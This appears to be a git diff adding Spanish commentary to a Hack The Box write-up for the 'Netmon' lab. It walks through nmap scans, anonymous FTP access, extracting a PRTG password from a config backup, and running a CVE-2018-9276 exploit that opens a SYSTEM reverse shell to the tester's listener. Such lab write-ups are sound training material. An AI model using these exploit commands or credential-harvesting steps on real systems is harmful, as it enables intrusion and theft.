@@ -1,4 +1,5 @@
 ---
+icon: desktop
 layout:
   title:
     visible: true
@@ -14,7 +15,15 @@ layout:
 
 # Netmon
 
+`Netmon` es un sistema operativo Windows de fácil manejo con enumeración y explotación sencillas. PRTG se está ejecutando y un servidor FTP con acceso anónimo permite leer los archivos de configuración de PRTG Network Monitor. La versión de PRTG es vulnerable a RCE, que puede explotarse para obtener un shell SYSTEM.
 
+<figure><img src="../../../.gitbook/assets/Netmon.png" alt="" width="563"><figcaption></figcaption></figure>
+
+***
+
+## Reconnaissance <a href="#reconnaissance" id="reconnaissance"></a>
+
+Realizaremos un reconocimiento con **nmap** para ver los puertos que están expuestos en la máquina **Heist**. Este resultado lo almacenaremos en un archivo llamado `allPorts`.
 
 ```bash
 ❯ nmap -p- --open -sS --min-rate 1000 -Pn -n 10.10.10.152 -oG allPorts
@@ -41,7 +50,7 @@ PORT      STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 25.47 seconds
 ```
 
-
+A través de la herramienta de [`extractPorts`](https://pastebin.com/X6b56TQ8), la utilizaremos para extraer los puertos del archivo que nos generó el primer escaneo a través de `Nmap`. Esta herramienta nos copiará en la clipboard los puertos encontrados.
 
 ```bash
 ❯ extractPorts allPorts
@@ -54,7 +63,7 @@ Nmap done: 1 IP address (1 host up) scanned in 25.47 seconds
 [*] Ports copied to clipboard
 ```
 
-
+Lanzaremos scripts de reconocimiento sobre los puertos encontrados y lo exportaremos en formato oN y oX para posteriormente trabajar con ellos.
 
 ```bash
 ❯ nmap -sCV -p21,80,135,139,445,5985,47001,49664,49665,49666,49667,49668,49669 10.10.10.152 -A -oN targeted -oX targetedXMl
@@ -125,32 +134,42 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 93.48 seconds
 ```
 
-
+Transformaremos el archivo generado `targetedXML` para transformar el XML en un archivo HTML para posteriormente montar un servidor web y visualizarlo.
 
 ```bash
+❯ xsltproc targetedXML > index.html
+
 ❯ python3 -m http.server 80
 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
 
-
+Accederemos a[ http://localhost](http://localhost) y verificaremos el resultado en un formato más cómodo para su análisis.
 
 <figure><img src="../../../.gitbook/assets/4049_vmware_1q7asSYLBu.png" alt=""><figcaption></figcaption></figure>
 
+## Web Enumeration
 
+Accederemos a http://10.10.10.152 y nos encontramos con un panel de inicio de sesión de `PRTG Network Monitor (NETMON)`.
+
+{% hint style="info" %}
+PRTG Network Monitor es una solución NMS para Monitorizar toda la infraestructura TI de una compañía, permitiendo tener una visión global del rendimiento y estado de tu red, asegurando que todos los componentes críticos de tu infraestructura IT que puedan afectar a tu negocio, estén disponibles 100%.
+{% endhint %}
 
 <figure><img src="../../../.gitbook/assets/imagen (11).png" alt=""><figcaption></figcaption></figure>
 
-
+Buscaremos si existen credenciales por defecto, nos encontramos con el siguiente blog el cual mencionan cuáles son las credenciales que se utiliza en la configuración por defecto.
 
 {% embed url="https://kb.paessler.com/en/topic/433-what-s-the-login-name-and-password-for-the-prtg-web-interface-how-do-i-change-it" %}
 
-prtgadmin/prtgadmin
-
-
+Al probar de acceder con las credenciales por defecto `prtgadmin/prtgadmin`, nos indica que no son correctas las credenciales proporcionadas.
 
 <figure><img src="../../../.gitbook/assets/imagen (1) (1).png" alt=""><figcaption></figcaption></figure>
 
+## FTP Enumeration
 
+En el escaneo de **Nmap**, comprobamos que el servicio FTP se encontraba expuesto y que tenía permitido el usuario `Anonymous` para acceder a él.
+
+Probaremos de acceder y comprobamos que al parecer nos encontramos en el directorio del sistema, un tanto inusual en un FTP.
 
 ```bash
 ❯ ftp 10.10.10.152
@@ -174,17 +193,19 @@ ftp> ls
 226 Transfer complete.
 ```
 
+### Information Leakage
 
+Dado que nos encontramos en el directorio del sistema del equipo víctima, decidimos probar si podíamos llegar a listar algún archivo de configuración o de backup del sitio web de **PRTG Network Monitor.**
+
+Nos encontramos con el siguiente blog en el cual mencionan donde `PRTG` almacena sus datos.
 
 {% embed url="https://kb.paessler.com/en/topic/463-how-and-where-does-prtg-store-its-data" %}
 
-
-
-
+Entre la información que se nos proporciona en el blog mencionado, el que parece interesarnos es el siguiente, en el cual almacenan los datos de la aplicación.
 
 <figure><img src="../../../.gitbook/assets/imagen (2) (1).png" alt="" width="521"><figcaption></figcaption></figure>
 
-
+Probaremos de acceder a la ruta mencionada y comprobamos que logramos acceder y visualizar varia información del `PRTG`.
 
 ```bash
 ftp> cd "ProgramData\Paessler\PRTG Network Monitor"
@@ -210,7 +231,7 @@ ftp> ls
 226 Transfer complete.
 ```
 
-
+Entre la información y datos que encontramos, nos llamó la atención un archivo con extensión `.bak` que parece ser un backup del archivo de configuración antiguo. Nos lo descargaremos en nuestro equipo para analizar el archivo.
 
 ```bash
 ftp> get "PRTG Configuration.old.bak"
@@ -222,7 +243,7 @@ local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
 1153755 bytes received in 00:01 (1.06 MiB/s)
 ```
 
-
+Analizaremos el archivo y filtraremos por el nombre de usuario que utiliza por defecto `PRTG`, logramos encontrar lo que parecen ser unas credenciuales de acceso.
 
 ```bash
 ❯ cat PRTG\ Configuration.old.bak | grep -C 2  'prtgadmin'
@@ -233,23 +254,37 @@ local: PRTG Configuration.old.bak remote: PRTG Configuration.old.bak
             </dbpassword>
 ```
 
-
+Probamos de acceder al panel de `PRTG` con las credenciales de `prtgadmin/PrTg@dmin2018`, pero no logramos obtener el acceso que esperábamos.
 
 <figure><img src="../../../.gitbook/assets/imagen (4) (1).png" alt=""><figcaption></figcaption></figure>
 
+Pensando que se trataba de un archivo antiguo de backup, pensamos que esta contraseña se trataba de la antigua, por lo tanto, decidimos probar si con las credenciales `PrTg@dmin2019` podíamos acceder al panel. Efectivamente las nuevas credenciales si nos proporcionaron el aceso.
 
+Esto es una mala praxis en empresas, de modificar la contraseña modificándole un carácter solamente.
 
 <figure><img src="../../../.gitbook/assets/imagen (5) (1).png" alt=""><figcaption></figcaption></figure>
 
+## Intrusion and Privilege Escalation
 
+### Abusing PRTG Network Monitor - Remote Code Execution \[RCE] (CVE-2018-9276)
+
+Verificando la versión de la aplicación de **PRTG**, nos encontramos que se trata de la versión **18.1.37.13946**.
 
 <figure><img src="../../../.gitbook/assets/imagen (6) (1).png" alt=""><figcaption></figcaption></figure>
 
+Buscando en internet sobre vulnerabilidades de esa versión del software, nos encontraamos con el siguiente `CVE-2018-9276`.
 
+{% hint style="danger" %}
+Se ha descubierto un problema en PRTG Network Monitor en versiones anteriores a la 18.2.39. Un atacante que tenga acceso a la consola web de administrador del sistema PRTG puede explotar una vulnerabilidad de inyección de comandos del sistema operativo (tanto en el servidor como en los dispositivos) enviando parámetros mal formados en escenarios de gestión de sensores o notificaciones.
+{% endhint %}
+
+{% embed url="https://www.incibe.es/incibe-cert/alerta-temprana/vulnerabilidades/cve-2018-9276" %}
+
+Por otro lado, nos encontramos con el siguiente repositorio con el exploit para aprovecharnos y abusar de esta vulnerabilidad.
 
 {% embed url="https://github.com/A1vinSmith/CVE-2018-9276" %}
 
-
+Nos descargaremos el proyecto de GitHub del exploit.
 
 ```bash
 ❯ git clone https://github.com/A1vinSmith/CVE-2018-9276.git; cd CVE-2018-9276
@@ -262,7 +297,9 @@ Recibiendo objetos: 100% (61/61), 20.57 KiB | 2.06 MiB/s, listo.
 Resolviendo deltas: 100% (19/19), listo.
 ```
 
+Realizaremos la explotación, indicaremos la dirección IP de la máquina víctima, nuestra dirección IP y el puerto donde estaremos en escucha y le especificaremos las credenciales de acceso al `PRTG Network Monitor`.
 
+Al realizar la explotación, verificamos que logramos obtener acceso al sistema víctima y en este caso disponemos de acceso como usuario `NT AUTHORITY\SYSTEM`.
 
 ```bash
 ❯ python3 exploit.py -i 10.10.10.152 -p 80 --lhost 10.10.16.5 --lport 443 --user prtgadmin --password PrTg@dmin2019
@@ -312,14 +349,14 @@ whoami
 nt authority\system
 ```
 
-
+Logramos visualizar las flags de **user.txt** y **root.txt**.
 
 ```powershell
 C:\Users\Administrator\Desktop>type root.txt
 type root.txt
-d7ce13a72ca8a2cae123a666fbe37c8c
+d7ce13a72ca*********************
 
 C:\Users\Administrator\Desktop>type C:\Users\Public\Desktop\user.txt
 type C:\Users\Public\Desktop\user.txt
-c9bb3ffd4f37e7cb2fea990be8fdf80a
+c9bb3ffd4f3*********************
 ```
